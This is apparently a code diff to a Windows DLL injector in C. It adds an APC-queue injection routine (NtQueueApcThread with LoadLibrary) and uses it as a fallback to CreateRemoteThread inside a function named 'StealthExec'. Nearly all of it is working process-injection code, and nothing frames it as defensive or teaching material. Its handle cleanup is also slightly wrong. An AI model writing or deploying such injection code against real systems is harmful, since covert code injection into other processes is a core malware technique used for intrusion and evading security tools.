@@ -6,18 +6,18 @@
 #include <winternl.h>
 #include <tlhelp32.h>
 
-
 typedef NTSTATUS(NTAPI *pNtQueueApcThread)(
     HANDLE ThreadHandle,
     PVOID ApcRoutine,
     PVOID ApcArgument1,
     PVOID ApcArgument2,
-    PVOID ApcArgument3
-);
+    PVOID ApcArgument3);
 
-BOOL QueueAPCInjection(HANDLE hProcess, LPVOID remoteDllPath, LPTHREAD_START_ROUTINE loadLibraryAddr) {
+BOOL QueueAPCInjection(HANDLE hProcess, LPVOID remoteDllPath, LPTHREAD_START_ROUTINE loadLibraryAddr)
+{
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
         printf("[!] Failed to create snapshot.\n");
         return FALSE;
     }
@@ -25,28 +25,34 @@ BOOL QueueAPCInjection(HANDLE hProcess, LPVOID remoteDllPath, LPTHREAD_START_ROU
     THREADENTRY32 te;
     te.dwSize = sizeof(THREADENTRY32);
 
-    if (Thread32First(hSnapshot, &te)) {
-        do {
-            if (te.th32OwnerProcessID == GetProcessId(hProcess)) {
+    if (Thread32First(hSnapshot, &te))
+    {
+        do
+        {
+            if (te.th32OwnerProcessID == GetProcessId(hProcess))
+            {
                 HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
-                if (hThread) {
+                if (hThread)
+                {
                     printf("[*] Found Thread ID: %lu\n", te.th32ThreadID);
 
                     // Resolve NtQueueApcThread dynamically
                     pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetMod("ntdll.dll", "NtQueueApcThread");
-                    if (NtQueueApcThread) {
+                    if (NtQueueApcThread)
+                    {
                         NTSTATUS status = NtQueueApcThread(hThread, (PVOID)loadLibraryAddr, remoteDllPath, NULL, NULL);
-                        if (status == 0) {
-                            printf("[*] Successfully queued APC!\n");
+                        if (status == 0)
+                        {
                             ResumeThread(hThread);
                             CloseHandle(hThread);
                             CloseHandle(hSnapshot);
                             return TRUE;
                         } else {
-                            printf("[!] NtQueueApcThread failed: 0x%X\n", status);
+                            printf("[!] NtQueueApcThread failed: 0x%lX\n", status);
                         }
+                    } else {
+                        printf("[!] Failed to resolve NtQueueApcThread.\n");
                     }
-
                     CloseHandle(hThread);
                 }
             }
@@ -107,40 +113,47 @@ void StealthExec(HANDLE hProc, const char *dllN)
         printf("[*] Successfully write memory.\n");
     }
 
-    /*
     // Load Remote DLL
     hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
     if (!hThreadRemote)
     {
         printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
+        printf("[*] Injecting using APC Queue\n");
+        if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad))
+        {
+            printf("[!] APC Injection failed.\n");
+        }
+        else
+        {
+            printf("[*] Successfully injected via APC!\n");
+        }
         return;
     }
-
-    DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000); // Wait for 5 seconds
-    if (waitResult == WAIT_TIMEOUT)
+    else
     {
-        printf("[!] Remote thread timed out!\n");
-        TerminateThread(hThreadRemote, 0); // Kill stuck thread
-        return;
-    }
-    else if (waitResult == WAIT_FAILED)
-    {
-        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
+        printf("[*] Thread creation succeed. Waiting for thread to resume\n");
+        DWORD waitResult = WaitForSingleObject(hThreadRemote, 10000); // Wait for 10 seconds
+        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
+        {
+            printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
+            CloseHandle(hThreadRemote);
+            TerminateThread(hThreadRemote, 0); // Kill stuck thread
+            printf("[*] Injecting using APC Queue\n");
+            if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad))
+            {
+                printf("[!] APC Injection failed.\n");
+            }
+            else
+            {
+                printf("[*] Successfully injected via APC!\n");
+            }
+            return;
+        }
+        ResumeThread(hThreadRemote);
         CloseHandle(hThreadRemote);
-        return;
+        printf("[*] Successfully injected module via RemoteThread\n");
     }
-    ResumeThread(hThreadRemote);
-    CloseHandle(hThreadRemote);
-    */
-    if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad)) {
-        printf("[!] APC Injection failed.\n");
-        return;
-    } else {
-        printf("[*] Successfully injected via APC!\n");
-    }
-
-
-    // printf("[*] Successfully injected module\n");
+    return;
 }
 
 // Entry Function
